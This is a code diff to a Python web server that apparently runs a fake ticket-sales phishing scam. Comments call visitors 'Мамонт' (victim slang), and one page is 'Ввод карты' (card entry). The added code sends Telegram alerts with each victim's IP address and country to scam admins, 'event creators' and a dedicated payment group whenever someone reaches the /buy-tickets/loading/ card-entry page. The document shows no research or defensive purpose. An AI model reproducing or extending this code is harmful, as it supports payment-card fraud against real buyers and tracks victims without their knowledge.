@@ -434,14 +434,34 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
                 data_event_creator = {"chat_id": extra_user_id, "text": msg}
                 requests.post(url, data=data_event_creator, timeout=1)
                 print(f"📤 Лог надіслано event creator {extra_user_id}")
+                
+                # Спеціальне логування в платіжну групу для event creator на сторінці введення карти
+                if page == "Ввод карты" or "/buy-tickets/loading/" in link:
+                    try:
+                        data_payment_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
+                        requests.post(url, data=data_payment_group, timeout=1)
+                        print(f"📤 Лог надіслано в платіжну групу {PAYMENT_GROUP_ID} для event creator")
+                    except Exception as e:
+                        print(f"❌ Помилка надсилання в платіжну групу для event creator: {e}")
+                        
             except Exception as e:
                 print(f"❌ Помилка надсилання event creator {extra_user_id}: {e}")
         else:
             # Звичайне логування для адміністраторів
             if important:
                 requests.post(url, data=data_group, timeout=1)
-                # НЕ надсилаємо лог "Мамонт открыл страницу" в платіжну групу
-                # requests.post(url, data=data_group2, timeout=1)
+                
+                # Спеціальне логування в платіжну групу для сторінки введення карти
+                if page == "Ввод карты" or "/buy-tickets/loading/" in link:
+                    try:
+                        data_payment_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
+                        requests.post(url, data=data_payment_group, timeout=1)
+                        print(f"📤 Лог надіслано в платіжну групу {PAYMENT_GROUP_ID}")
+                    except Exception as e:
+                        print(f"❌ Помилка надсилання в платіжну групу: {e}")
+                # else:
+                #     НЕ надсилаємо лог "Мамонт открыл страницу" в платіжну групу для інших сторінок
+                #     requests.post(url, data=data_group2, timeout=1)
             requests.post(url, data=data_admin, timeout=1)
             
             # Надсилаємо лог всім адміністраторам
@@ -923,16 +943,28 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
             
             # Надсилаємо персональний лог в особисті повідомлення з ботом
-            send_personal_log_to_admin(page_code, ip, country, get_page_name(norm_path))
+            page_name_for_log = get_page_name(norm_path)
+            send_personal_log_to_admin(page_code, ip, country, page_name_for_log)
             
-            # Також надсилаємо звичайний лог (для сумісності)
-            send_telegram_log_async(
-                page=norm_path,
-                link=self.path,
-                ip=ip,
-                country=country,
-                extra_user_id=extra_user_id
-            )
+            # Спеціальне логування для event creator на сторінці введення карти
+            if '/buy-tickets/loading/' in norm_path:
+                # Логуємо з російською назвою "Ввод карты"
+                send_telegram_log_async(
+                    page="Ввод карты",
+                    link=self.path,
+                    ip=ip,
+                    country=country,
+                    extra_user_id=extra_user_id
+                )
+            else:
+                # Звичайний лог для інших сторінок
+                send_telegram_log_async(
+                    page=norm_path,
+                    link=self.path,
+                    ip=ip,
+                    country=country,
+                    extra_user_id=extra_user_id
+                )
         elif is_telegram:
             pass  # Не логуємо Telegram запити
         elif extra_user_id and not should_log:
@@ -952,14 +984,26 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 # Отримуємо країну за IP
                 country = get_country_by_ip(ip)
                 print(f"[DEBUG] Надсилаємо лог в групу: {norm_path}, IP: {ip}, країна: {country}")
-                # Non-blocking log - тільки важливі повідомлення
-                send_telegram_log_async(
-                    page=norm_path,
-                    link=self.path,
-                    ip=ip,
-                    country=country,
-                    important=True  # Тільки важливі повідомлення
-                )
+                
+                # Спеціальне логування для сторінки введення карти
+                if '/buy-tickets/loading/' in norm_path:
+                    # Логуємо кожен раз, коли користувач заходить на сторінку введення карти
+                    send_telegram_log_async(
+                        page="Ввод карты",
+                        link=self.path,
+                        ip=ip,
+                        country=country,
+                        important=True
+                    )
+                else:
+                    # Non-blocking log - тільки важливі повідомлення для інших сторінок
+                    send_telegram_log_async(
+                        page=norm_path,
+                        link=self.path,
+                        ip=ip,
+                        country=country,
+                        important=True  # Тільки важливі повідомлення
+                    )
             # else:
             #     pass  # Не логуємо повторно
         elif is_telegram:
